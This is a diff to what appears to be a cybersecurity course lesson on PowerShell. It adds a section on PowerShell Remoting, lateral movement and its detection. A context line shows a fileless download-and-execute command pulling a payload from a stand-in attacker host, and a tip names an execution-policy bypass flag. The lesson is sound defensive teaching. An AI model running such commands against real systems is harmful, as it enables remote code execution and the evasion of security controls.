@@ -57,6 +57,10 @@ Invoke-WebRequest -Uri "http://attacker.com/payload.ps1" | Invoke-Expression
 
 This single line downloads and immediately executes remote code, entirely "fileless" (Path 16's malware families lesson) — nothing ever touches disk as a traditional executable, evading detection approaches that only scan files.
 
+## PowerShell remoting — administration at a distance, and its risks
+
+Beyond running commands locally, **PowerShell Remoting** (`Enter-PSSession`, `Invoke-Command`) lets an authenticated user execute commands on a *remote* Windows machine over the network, using the WS-Management protocol (WinRM) — the legitimate administrative backbone that lets IT teams manage hundreds of machines without physically touching each one. This exact capability is also precisely how an attacker who's obtained valid credentials performs **lateral movement** (Path 11's Active Directory lesson) between machines on a compromised network — `Invoke-Command -ComputerName target-pc -ScriptBlock { ... }` looks identical whether a legitimate administrator or an attacker with stolen credentials issued it, which is exactly why the Event ID 4648 (explicit-credential logon) and PowerShell script-block logging from this path's Event Viewer lesson matter so much for distinguishing the two after the fact. WinRM is disabled by default on workstations but commonly enabled on servers and in managed corporate environments — worth checking (`Get-Service WinRM`) as part of any security review, since an unnecessarily-enabled remoting service on a machine that doesn't need it is pure unused attack surface.
+
 :::tip PowerShell execution policy — a speed bump, not a wall
 Windows' default **execution policy** restricts running unsigned PowerShell scripts, but this is explicitly a safety net against accidental execution, not a genuine security boundary — it can be bypassed in numerous well-documented ways (`-ExecutionPolicy Bypass`, among others), similar in spirit to how root/jailbreak detection (Path 15) raises the bar without being unbreakable. Never rely on execution policy alone as your only defense.
 :::
